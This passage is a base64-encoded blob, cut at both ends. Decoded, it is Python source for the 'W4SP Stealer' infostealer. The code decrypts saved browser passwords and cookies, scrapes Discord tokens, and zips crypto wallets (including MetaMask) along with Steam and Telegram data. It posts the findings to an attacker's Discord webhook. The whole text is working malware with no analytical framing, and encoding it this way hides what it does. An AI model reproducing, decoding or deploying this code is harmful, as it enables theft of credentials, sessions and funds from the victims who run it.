Z2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgIH0KCiAgICBpZiBuYW1lID09ICJ3cGNvb2siOgogICAgICAgIHJiID0gJyB8ICcuam9pbihkYSBmb3IgZGEgaW4gY29va2lXb3JkcykKICAgICAgICBpZiBsZW4ocmIpID4gMTAwMDogCiAgICAgICAgICAgIHJycnJyID0gUmVmb3JtYXQoc3RyKGNvb2tpV29yZHMpKQogICAgICAgICAgICByYiA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIHJycnJyKQogICAgICAgIGRhdGEgPSB7CiAgICAgICAgICAgICJjb250ZW50IjogZ2xvYmFsSW5mbygpLAogICAgICAgICAgICAiZW1iZWRzIjogWwogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJ0aXRsZSI6ICJXNFNQIHwgQ29va2llcyBTdGVhbGVyIiwKICAgICAgICAgICAgICAgICAgICAiZGVzY3JpcHRpb24iOiBmIioqRm91bmQqKjpcbntyYn1cblxuKipEYXRhOioqXG46Y29va2llOiDigKIgKip7Q29va2lDb3VudH0qKiBDb29raWVzIEZvdW5kXG46bGluazog4oCiIFt3NHNwQ29va2llcy50eHRdKHtsaW5rfSkiLAogICAgICAgICAgICAgICAgICAgICJjb2xvciI6IDE0NDA2NDEzLAogICAgICAgICAgICAgICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICJ0ZXh0IjogIkBXNFNQIFNURUFMRVIiLAogICAgICAgICAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTYzMTE0MzQ5ODc3MTYyMDA0Lzk5MjI0NTc1MTI0NzgwNjUxNS91bmtub3duLnBuZyIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIF0sCiAgICAgICAgICAgICJ1c2VybmFtZSI6ICJXNFNQIiwKICAgICAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTYzMTE0MzQ5ODc3MTYyMDA0Lzk5MjI0NTc1MTI0NzgwNjUxNS91bmtub3duLnBuZyIsCiAgICAgICAgICAgICJhdHRhY2htZW50cyI6IFtdCiAgICAgICAgICAgIH0KICAgICAgICBMb2FkVXJsaWIoaG9vaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgIHJldHVybgoKICAgIGlmIG5hbWUgPT0gIndwcGFzc3ciOgogICAgICAgIHJhID0gJyB8ICcuam9pbihkYSBmb3IgZGEgaW4gcGFzd1dvcmRzKQogICAgICAgIGlmIGxlbihyYSkgPiAxMDAwOiAKICAgICAgICAgICAgcnJyID0gUmVmb3JtYXQoc3RyKHBhc3dXb3JkcykpCiAgICAgICAgICAgIHJhID0gJyB8ICcuam9pbihkYSBmb3IgZGEgaW4gcnJyKQoKICAgICAgICBkYXRhID0gewogICAgICAgICAgICAiY29udGVudCI6IGdsb2JhbEluZm8oKSwKICAgICAgICAgICAgImVtYmVkcyI6IFsKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAidGl0bGUiOiAiVzRTUCB8IFBhc3N3b3JkIFN0ZWFsZXIiLAogICAgICAgICAgICAgICAgICAgICJkZXNjcmlwdGlvbiI6IGYiKipGb3VuZCoqOlxue3JhfVxuXG4qKkRhdGE6KipcbvCflJEg4oCiICoqe1Bhc3N3Q291bnR9KiogUGFzc3dvcmRzIEZvdW5kXG46bGluazog4oCiIFt3NHNwUGFzc3dvcmQudHh0XSh7bGlua30pIiwKICAgICAgICAgICAgICAgICAgICAiY29sb3IiOiAxNDQwNjQxMywKICAgICAgICAgICAgICAgICAgICAiZm9vdGVyIjogewogICAgICAgICAgICAgICAgICAgICAgICAidGV4dCI6ICJAVzRTUCBTVEVBTEVSIiwKICAgICAgICAgICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk2MzExNDM0OTg3NzE2MjAwNC85OTIyNDU3NTEyNDc4MDY1MTUvdW5rbm93bi5wbmciCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICBdLAogICAgICAgICAgICAidXNlcm5hbWUiOiAiVzRTUCIsCiAgICAgICAgICAgICJhdmF0YXJfdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk2MzExNDM0OTg3NzE2MjAwNC85OTIyNDU3NTEyNDc4MDY1MTUvdW5rbm93bi5wbmciLAogICAgICAgICAgICAiYXR0YWNobWVudHMiOiBbXQogICAgICAgICAgICB9CiAgICAgICAgTG9hZFVybGliKGhvb2ssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykKICAgICAgICByZXR1cm4KCiAgICBpZiBuYW1lID09ICJraXdpIjoKICAgICAgICBkYXRhID0gewogICAgICAgICAgICAiY29udGVudCI6IGdsb2JhbEluZm8oKSwKICAgICAgICAgICAgImVtYmVkcyI6IFsKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICJjb2xvciI6IDE0NDA2NDEzLAogICAgICAgICAgICAgICAgImZpZWxkcyI6IFsKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiSW50ZXJlc3RpbmcgZmlsZXMgZm91bmQgb24gdXNlciBQQzoiLAogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGxpbmsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBdLAogICAgICAgICAgICAgICAgImF1dGhvciI6IHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICJXNFNQIHwgRmlsZSBTdGVhbGVyIgogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICAgICAgICAgInRleHQiOiAiQFc0U1AgU1RFQUxFUiIsCiAgICAgICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk2MzExNDM0OTg3NzE2MjAwNC85OTIyNDU3NTEyNDc4MDY1MTUvdW5rbm93bi5wbmciCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIF0sCiAgICAgICAgICAgICJ1c2VybmFtZSI6ICJXNFNQIiwKICAgICAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTYzMTE0MzQ5ODc3MTYyMDA0Lzk5MjI0NTc1MTI0NzgwNjUxNS91bmtub3duLnBuZyIsCiAgICAgICAgICAgICJhdHRhY2htZW50cyI6IFtdCiAgICAgICAgICAgIH0KICAgICAgICBMb2FkVXJsaWIoaG9vaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgIHJldHVybgoKCgojIGRlZiB1cGxvYWQobmFtZSwgdGs9JycpOgojICAgICBoZWFkZXJzID0gewojICAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKIyAgICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgojICAgICB9CgojICAgICAjIHIgPSByZXF1ZXN0cy5wb3N0KGhvb2ssIGZpbGVzPWZpbGVzKQojICAgICBMb2FkUmVxdWVzdHMoIlBPU1QiLCBob29rLCBmaWxlcz1maWxlcykKCmRlZiB3cml0ZWZvcmZpbGUoZGF0YSwgbmFtZSk6CiAgICBwYXRoID0gb3MuZ2V0ZW52KCJURU1QIikgKyBmIlx3cHtuYW1lfS50eHQiCiAgICB3aXRoIG9wZW4ocGF0aCwgbW9kZT0ndycsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6CiAgICAgICAgZi53cml0ZShmIjwtLVc0U1AgU1RFQUxFUiBPTiBUT1AtLT5cblxuIikKICAgICAgICBmb3IgbGluZSBpbiBkYXRhOgogICAgICAgICAgICBpZiBsaW5lWzBdICE9ICcnOgogICAgICAgICAgICAgICAgZi53cml0ZShmIntsaW5lfVxuIikKClRva2VucyA9ICcnCmRlZiBnZXRUb2tlbihwYXRoLCBhcmcpOgogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4KCiAgICBwYXRoICs9IGFyZwogICAgZm9yIGZpbGUgaW4gb3MubGlzdGRpcihwYXRoKToKICAgICAgICBpZiBmaWxlLmVuZHN3aXRoKCIubG9nIikgb3IgZmlsZS5lbmRzd2l0aCgiLmxkYiIpICAgOgogICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZiJ7cGF0aH1cXHtmaWxlfSIsIGVycm9ycz0iaWdub3JlIikucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgIGZvciByZWdleCBpbiAociJbXHctXXsyNH1cLltcdy1dezZ9XC5bXHctXXsyNSwxMTB9IiwgciJtZmFcLltcdy1dezgwLDk1fSIpOgogICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHJlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgZ2xvYmFsIFRva2VucwogICAgICAgICAgICAgICAgICAgICAgICBpZiBjaGVja1Rva2VuKHRva2VuKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCB0b2tlbiBpbiBUb2tlbnM6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBwcmludCh0b2tlbikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUb2tlbnMgKz0gdG9rZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cGxvYWRUb2tlbih0b2tlbiwgcGF0aCkKClBhc3N3ID0gW10KZGVmIGdldFBhc3N3KHBhdGgsIGFyZyk6CiAgICBnbG9iYWwgUGFzc3csIFBhc3N3Q291bnQKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKTogcmV0dXJuCgogICAgcGF0aEMgPSBwYXRoICsgYXJnICsgIi9Mb2dpbiBEYXRhIgogICAgaWYgb3Muc3RhdChwYXRoQykuc3Rfc2l6ZSA9PSAwOiByZXR1cm4KCiAgICB0ZW1wZm9sZCA9IHRlbXAgKyAid3AiICsgJycuam9pbihyYW5kb20uY2hvaWNlKCdiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JykgZm9yIGkgaW4gcmFuZ2UoOCkpICsgIi5kYiIKCiAgICBzaHV0aWwuY29weTIocGF0aEMsIHRlbXBmb2xkKQogICAgY29ubiA9IHNxbF9jb25uZWN0KHRlbXBmb2xkKQogICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQogICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBhY3Rpb25fdXJsLCB1c2VybmFtZV92YWx1ZSwgcGFzc3dvcmRfdmFsdWUgRlJPTSBsb2dpbnM7IikKICAgIGRhdGEgPSBjdXJzb3IuZmV0Y2hhbGwoKQogICAgY3Vyc29yLmNsb3NlKCkKICAgIGNvbm4uY2xvc2UoKQogICAgb3MucmVtb3ZlKHRlbXBmb2xkKQoKICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSIKICAgIHdpdGggb3BlbihwYXRoS2V5LCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6IGxvY2FsX3N0YXRlID0ganNvbl9sb2FkcyhmLnJlYWQoKSkKICAgIG1hc3Rlcl9rZXkgPSBiNjRkZWNvZGUobG9jYWxfc3RhdGVbJ29zX2NyeXB0J11bJ2VuY3J5cHRlZF9rZXknXSkKICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pCgogICAgZm9yIHJvdyBpbiBkYXRhOiAKICAgICAgICBpZiByb3dbMF0gIT0gJyc6CiAgICAgICAgICAgIGZvciB3YSBpbiBrZXl3b3JkOgogICAgICAgICAgICAgICAgb2xkID0gd2EKICAgICAgICAgICAgICAgIGlmICJodHRwcyIgaW4gd2E6CiAgICAgICAgICAgICAgICAgICAgdG1wID0gd2EKICAgICAgICAgICAgICAgICAgICB3YSA9IHRtcC5zcGxpdCgnWycpWzFdLnNwbGl0KCddJylbMF0KICAgICAgICAgICAgICAgIGlmIHdhIGluIHJvd1swXToKICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb2xkIGluIHBhc3dXb3JkczogcGFzd1dvcmRzLmFwcGVuZChvbGQpCiAgICAgICAgICAgIFBhc3N3LmFwcGVuZChmIlVSMToge3Jvd1swXX0gfCBVNTNSTjRNMzoge3Jvd1sxXX0gfCBQNDU1VzBSRDoge0RlY3J5cHRWYWx1ZShyb3dbMl0sIG1hc3Rlcl9rZXkpfSIpCiAgICAgICAgICAgIFBhc3N3Q291bnQgKz0gMQogICAgd3JpdGVmb3JmaWxlKFBhc3N3LCAncGFzc3cnKQoKQ29va2llcyA9IFtdICAgIApkZWYgZ2V0Q29va2llKHBhdGgsIGFyZyk6CiAgICBnbG9iYWwgQ29va2llcywgQ29va2lDb3VudAogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4KICAgIAogICAgcGF0aEMgPSBwYXRoICsgYXJnICsgIi9Db29raWVzIgogICAgaWYgb3Muc3RhdChwYXRoQykuc3Rfc2l6ZSA9PSAwOiByZXR1cm4KICAgIAogICAgdGVtcGZvbGQgPSB0ZW1wICsgIndwIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZSgnYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eicpIGZvciBpIGluIHJhbmdlKDgpKSArICIuZGIiCiAgICAKICAgIHNodXRpbC5jb3B5MihwYXRoQywgdGVtcGZvbGQpCiAgICBjb25uID0gc3FsX2Nvbm5lY3QodGVtcGZvbGQpCiAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpCiAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIGhvc3Rfa2V5LCBuYW1lLCBlbmNyeXB0ZWRfdmFsdWUgRlJPTSBjb29raWVzIikKICAgIGRhdGEgPSBjdXJzb3IuZmV0Y2hhbGwoKQogICAgY3Vyc29yLmNsb3NlKCkKICAgIGNvbm4uY2xvc2UoKQogICAgb3MucmVtb3ZlKHRlbXBmb2xkKQoKICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSIKICAgIAogICAgd2l0aCBvcGVuKHBhdGhLZXksICdyJywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjogbG9jYWxfc3RhdGUgPSBqc29uX2xvYWRzKGYucmVhZCgpKQogICAgbWFzdGVyX2tleSA9IGI2NGRlY29kZShsb2NhbF9zdGF0ZVsnb3NfY3J5cHQnXVsnZW5jcnlwdGVkX2tleSddKQogICAgbWFzdGVyX2tleSA9IENyeXB0VW5wcm90ZWN0RGF0YShtYXN0ZXJfa2V5WzU6XSkKCiAgICBmb3Igcm93IGluIGRhdGE6IAogICAgICAgIGlmIHJvd1swXSAhPSAnJzoKICAgICAgICAgICAgZm9yIHdhIGluIGtleXdvcmQ6CiAgICAgICAgICAgICAgICBvbGQgPSB3YQogICAgICAgICAgICAgICAgaWYgImh0dHBzIiBpbiB3YToKICAgICAgICAgICAgICAgICAgICB0bXAgPSB3YQogICAgICAgICAgICAgICAgICAgIHdhID0gdG1wLnNwbGl0KCdbJylbMV0uc3BsaXQoJ10nKVswXQogICAgICAgICAgICAgICAgaWYgd2EgaW4gcm93WzBdOgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBvbGQgaW4gY29va2lXb3JkczogY29va2lXb3Jkcy5hcHBlbmQob2xkKQogICAgICAgICAgICBDb29raWVzLmFwcGVuZChmIkgwNTcgSzNZOiB7cm93WzBdfSB8IE40TTM6IHtyb3dbMV19IHwgVjQxVTM6IHtEZWNyeXB0VmFsdWUocm93WzJdLCBtYXN0ZXJfa2V5KX0iKQogICAgICAgICAgICBDb29raUNvdW50ICs9IDEKICAgIHdyaXRlZm9yZmlsZShDb29raWVzLCAnY29vaycpCgpkZWYgR2V0RGlzY29yZChwYXRoLCBhcmcpOgogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGYie3BhdGh9L0xvY2FsIFN0YXRlIik6IHJldHVybgoKICAgIHBhdGhDID0gcGF0aCArIGFyZwoKICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSIKICAgIHdpdGggb3BlbihwYXRoS2V5LCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6IGxvY2FsX3N0YXRlID0ganNvbl9sb2FkcyhmLnJlYWQoKSkKICAgIG1hc3Rlcl9rZXkgPSBiNjRkZWNvZGUobG9jYWxfc3RhdGVbJ29zX2NyeXB0J11bJ2VuY3J5cHRlZF9rZXknXSkKICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pCiAgICAjIHByaW50KHBhdGgsIG1hc3Rlcl9rZXkpCiAgICAKICAgIGZvciBmaWxlIGluIG9zLmxpc3RkaXIocGF0aEMpOgogICAgICAgICMgcHJpbnQocGF0aCwgZmlsZSkKICAgICAgICBpZiBmaWxlLmVuZHN3aXRoKCIubG9nIikgb3IgZmlsZS5lbmRzd2l0aCgiLmxkYiIpICAgOgogICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZiJ7cGF0aEN9XFx7ZmlsZX0iLCBlcnJvcnM9Imlnbm9yZSIpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06CiAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gcmUuZmluZGFsbChyImRRdzR3OVdnWGNROlteLipcWycoLiopJ1xdLiokXVteXCJdKiIsIGxpbmUpOgogICAgICAgICAgICAgICAgICAgIGdsb2JhbCBUb2tlbnMKICAgICAgICAgICAgICAgICAgICB0b2tlbkRlY29kZWQgPSBEZWNyeXB0VmFsdWUoYjY0ZGVjb2RlKHRva2VuLnNwbGl0KCdkUXc0dzlXZ1hjUTonKVsxXSksIG1hc3Rlcl9rZXkpCiAgICAgICAgICAgICAgICAgICAgaWYgY2hlY2tUb2tlbih0b2tlbkRlY29kZWQpOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgdG9rZW5EZWNvZGVkIGluIFRva2VuczoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgcHJpbnQodG9rZW4pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUb2tlbnMgKz0gdG9rZW5EZWNvZGVkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHdyaXRlZm9yZmlsZShUb2tlbnMsICd0b2tlbnMnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdXBsb2FkVG9rZW4odG9rZW5EZWNvZGVkLCBwYXRoKQoKZGVmIEdhdGhlclppcHMocGF0aHMxLCBwYXRoczIsIHBhdGhzMyk6CiAgICB0aHR0aHQgPSBbXQogICAgZm9yIHBhdHQgaW4gcGF0aHMxOgogICAgICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aaXBUaGluZ3MsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbNV0sIHBhdHRbMV1dKQogICAgICAgIGEuc3RhcnQoKQogICAgICAgIHRodHRodC5hcHBlbmQoYSkKCiAgICBmb3IgcGF0dCBpbiBwYXRoczI6CiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVppcFRoaW5ncywgYXJncz1bcGF0dFswXSwgcGF0dFsyXSwgcGF0dFsxXV0pCiAgICAgICAgYS5zdGFydCgpCiAgICAgICAgdGh0dGh0LmFwcGVuZChhKQogICAgCiAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WmlwVGVsZWdyYW0sIGFyZ3M9W3BhdGhzM1swXSwgcGF0aHMzWzJdLCBwYXRoczNbMV1dKQogICAgYS5zdGFydCgpCiAgICB0aHR0aHQuYXBwZW5kKGEpCgogICAgZm9yIHRocmVhZCBpbiB0aHR0aHQ6IAogICAgICAgIHRocmVhZC5qb2luKCkKICAgIGdsb2JhbCBXYWxsZXRzWmlwLCBHYW1pbmdaaXAsIE90aGVyWmlwCiAgICAgICAgIyBwcmludChXYWxsZXRzWmlwLCBHYW1pbmdaaXAsIE90aGVyWmlwKQoKICAgIHdhbCwgZ2EsIG90ID0gIiIsJycsJycKICAgIGlmIG5vdCBsZW4oV2FsbGV0c1ppcCkgPT0gMDoKICAgICAgICB3YWwgPSAiOmNvaW46ICDigKIgIFdhbGxldHNcbiIKICAgICAgICBmb3IgaSBpbiBXYWxsZXRzWmlwOgogICAgICAgICAgICB3YWwgKz0gZiLilJTilIAgW3tpWzBdfV0oe2lbMV19KVxuIgogICAgaWYgbm90IGxlbihXYWxsZXRzWmlwKSA9PSAwOgogICAgICAgIGdhID0gIjp2aWRlb19nYW1lOiAg4oCiICBHYW1pbmc6XG4iCiAgICAgICAgZm9yIGkgaW4gR2FtaW5nWmlwOgogICAgICAgICAgICBnYSArPSBmIuKUlOKUgCBbe2lbMF19XSh7aVsxXX0pXG4iCiAgICBpZiBub3QgbGVuKE90aGVyWmlwKSA9PSAwOgogICAgICAgIG90ID0gIjp0aWNrZXRzOiAg4oCiICBBcHBzXG4iCiAgICAgICAgZm9yIGkgaW4gT3RoZXJaaXA6CiAgICAgICAgICAgIG90ICs9IGYi4pSU4pSAIFt7aVswXX1dKHtpWzFdfSlcbiIgICAgICAgICAgCiAgICBoZWFkZXJzID0gewogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICB9CgogICAgZGF0YSA9IHsKICAgICAgICAiY29udGVudCI6IGdsb2JhbEluZm8oKSwKICAgICAgICAiZW1iZWRzIjogWwogICAgICAgICAgICB7CiAgICAgICAgICAgICJ0aXRsZSI6ICJXNFNQIFppcHMiLAogICAgICAgICAgICAiZGVzY3JpcHRpb24iOiBmInt3YWx9XG57Z2F9XG57b3R9IiwKICAgICAgICAgICAgImNvbG9yIjogMTU3ODE0MDMsCiAgICAgICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICAgICAidGV4dCI6ICJAVzRTUCBTVEVBTEVSIiwKICAgICAgICAgICAgICAgICJpY29uX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NjMxMTQzNDk4NzcxNjIwMDQvOTkyMjQ1NzUxMjQ3ODA2NTE1L3Vua25vd24ucG5nIgogICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICBdLAogICAgICAgICJ1c2VybmFtZSI6ICJXNFNQIFN0ZWFsZXIiLAogICAgICAgICJhdmF0YXJfdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk2MzExNDM0OTg3NzE2MjAwNC85OTIyNDU3NTEyNDc4MDY1MTUvdW5rbm93bi5wbmciLAogICAgICAgICJhdHRhY2htZW50cyI6IFtdCiAgICB9CiAgICBMb2FkVXJsaWIoaG9vaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQoKCmRlZiBaaXBUZWxlZ3JhbShwYXRoLCBhcmcsIHByb2NjKToKICAgIGdsb2JhbCBPdGhlclppcAogICAgcGF0aEMgPSBwYXRoCiAgICBuYW1lID0gYXJnCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aEMpOiByZXR1cm4KICAgIHN1YnByb2Nlc3MuUG9wZW4oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiA+bnVsIDI+JjEiLCBzaGVsbD1UcnVlKQoKICAgIHpmID0gWmlwRmlsZShmIntwYXRoQ30ve25hbWV9LnppcCIsICJ3IikKICAgIGZvciBmaWxlIGluIG9zLmxpc3RkaXIocGF0aEMpOgogICAgICAgIGlmIG5vdCAiLnppcCIgaW4gZmlsZSBhbmQgbm90ICJ0ZHVtbXkiIGluIGZpbGUgYW5kIG5vdCAidXNlcl9kYXRhIiBpbiBmaWxlIGFuZCBub3QgIndlYnZpZXciIGluIGZpbGU6IAogICAgICAgICAgICB6Zi53cml0ZShwYXRoQyArICIvIiArIGZpbGUpCiAgICB6Zi5jbG9zZSgpCgogICAgIyBsbmlrID0gdXBsb2FkVG9Bbm9uZmlsZXMoZid7cGF0aEN9L3tuYW1lfS56aXAnKQogICAgbG5payA9ICJodHRwczovL2dvb2dsZS5jb20iCiAgICBvcy5yZW1vdmUoZiJ7cGF0aEN9L3tuYW1lfS56aXAiKQogICAgT3RoZXJaaXAuYXBwZW5kKFthcmcsIGxuaWtdKQoKZGVmIFppcFRoaW5ncyhwYXRoLCBhcmcsIHByb2NjKToKICAgIHBhdGhDID0gcGF0aAogICAgbmFtZSA9IGFyZwogICAgZ2xvYmFsIFdhbGxldHNaaXAsIEdhbWluZ1ppcCwgT3RoZXJaaXAKICAgICMgc3VicHJvY2Vzcy5Qb3BlbihmInRhc2traWxsIC9pbSB7cHJvY2N9IC90IC9mIiwgc2hlbGw9VHJ1ZSkKICAgICMgb3Muc3lzdGVtKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YiKQoKICAgIGlmICJua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgaW4gYXJnOgogICAgICAgIGJyb3dzZXIgPSBwYXRoLnNwbGl0KCJcXCIpWzRdLnNwbGl0KCIvIilbMV0ucmVwbGFjZSgnICcsICcnKQogICAgICAgIG5hbWUgPSBmIk1ldGFtYXNrX3ticm93c2VyfSIKICAgICAgICBwYXRoQyA9IHBhdGggKyBhcmcKICAgIAogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGhDKTogcmV0dXJuCiAgICBzdWJwcm9jZXNzLlBvcGVuKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YgPm51bCAyPiYxIiwgc2hlbGw9VHJ1ZSkKCiAgICBpZiAiV2FsbGV0IiBpbiBhcmcgb3IgIk5hdGlvbnNHbG9yeSIgaW4gYXJnOgogICAgICAgIGJyb3dzZXIgPSBwYXRoLnNwbGl0KCJcXCIpWzRdLnNwbGl0KCIvIilbMV0ucmVwbGFjZSgnICcsICcnKQogICAgICAgIG5hbWUgPSBmInticm93c2VyfSIKCiAgICBlbGlmICJTdGVhbSIgaW4gYXJnOgogICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShmIntwYXRoQ30vbG9naW51c2Vycy52ZGYiKTogcmV0dXJuCiAgICAgICAgZiA9IG9wZW4oZiJ7cGF0aEN9L2xvZ2ludXNlcnMudmRmIiwgInIrIiwgZW5jb2Rpbmc9InV0ZjgiKQogICAgICAgIGRhdGEgPSBmLnJlYWRsaW5lcygpCiAgICAgICAgIyBwcmludChkYXRhKQogICAgICAgIGZvdW5kID0gRmFsc2UKICAgICAgICBmb3IgbCBpbiBkYXRhOgogICAgICAgICAgICBpZiAnUmVtZW1iZXJQYXNzd29yZCJcdFx0IjEiJyBpbiBsOgogICAgICAgICAgICAgICAgZm91bmQgPSBUcnVlCiAgICAgICAgaWYgZm91bmQgPT0gRmFsc2U6IHJldHVybgogICAgICAgIG5hbWUgPSBhcmcKCgogICAgemYgPSBaaXBGaWxlKGYie3BhdGhDfS97bmFtZX0uemlwIiwgInciKQogICAgZm9yIGZpbGUgaW4gb3MubGlzdGRpcihwYXRoQyk6CiAgICAgICAgaWYgbm90ICIuemlwIiBpbiBmaWxlOiB6Zi53cml0ZShwYXRoQyArICIvIiArIGZpbGUpCiAgICB6Zi5jbG9zZSgpCgogICAgIyBsbmlrID0gdXBsb2FkVG9Bbm9uZmlsZXMoZid7cGF0aEN9L3tuYW1lfS56aXAnKQogICAgbG5payA9ICJodHRwczovL2dvb2dsZS5jb20iCiAgICBvcy5yZW1vdmUoZiJ7cGF0aEN9L3tuYW1lfS56aXAiKQoKICAgIGlmICJXYWxsZXQiIGluIGFyZyBvciAiZW9nYWVhb2VobGVmIiBpbiBhcmc6CiAgICAgICAgV2FsbGV0c1ppcC5hcHBlbmQoW25hbWUsIGxuaWtdKQogICAgZWxpZiAiTmF0aW9uc0dsb3J5IiBpbiBuYW1lIG9yICJTdGVhbSIgaW4gbmFtZSBvciAiUmlvdENsaSIgaW4gbmFtZToKICAgICAgICBHYW1pbmdaaXAuYXBwZW5kKFtuYW1lLCBsbmlrXSkKICAgIGVsc2U6CiAgICAgICAgT3RoZXJaaXAuYXBwZW5kKFtuYW1lLCB